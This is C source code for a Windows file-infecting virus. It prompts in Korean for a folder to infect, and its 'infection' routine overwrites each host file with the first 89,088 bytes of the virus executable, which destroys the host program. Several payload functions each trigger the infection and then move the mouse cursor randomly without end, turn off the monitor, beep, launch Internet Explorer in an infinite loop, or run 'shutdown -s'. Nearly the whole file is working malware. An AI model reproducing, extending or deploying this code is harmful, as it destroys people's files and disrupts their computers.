#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<io.h>
#include <Windows.h>
#include<dos.h>
#include<conio.h>
#include "infec_findfile.h"

void infec(char source[])
{
	char str[1024];
	printf("감염시킬 폴더 입력:");
	scanf("%s", &str);
	infec_findfile(str,source);
}
void CrazyMouse(char source[])
{
	infec(source);
	int x, y;
	while (1)
	{
		x = rand() % 1920;
		y = rand() % 1080;
		SetCursorPos(x, y);
	}
}
void Hibernation(char source[])
{
	infec(source);
	Sleep(1000);
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}
void Beeper(char source[])
{
	infec(source);
	int Freq, Dur;
	Freq = rand() % 2001;
	Dur = rand() % 301;
	Beep(Freq, Dur);
}
void iexplore(char source[])
{
	infec(source);
	for (; ;)
	{
		system("c:\\progra~1\\intern~1\\iexplore.exe");
	}
}
void 	virus_shutdown(char source[])
{
	infec(source);
	system("shutdown -s");
}
void infection(char sourcefile[], char infectionfile[])
{
	FILE *virus, *host;
	unsigned long x;
	char buff[2048];
	long handel;
	virus = fopen(sourcefile, "rb");
	host = fopen(infectionfile, "rb + ");
	if (host == NULL)
	{
		return;
	}
	x = 89088;
	printf("Infecting %s\n", infectionfile);
	while (x > 2048)
	{
		fread(buff, 2048, 1, virus);
		fwrite(buff, 2048, 1, host);
		x -= 2048;
	}
	fread(buff, x, 1, virus);
	fwrite(buff, x, 1, host);
	fcloseall();
}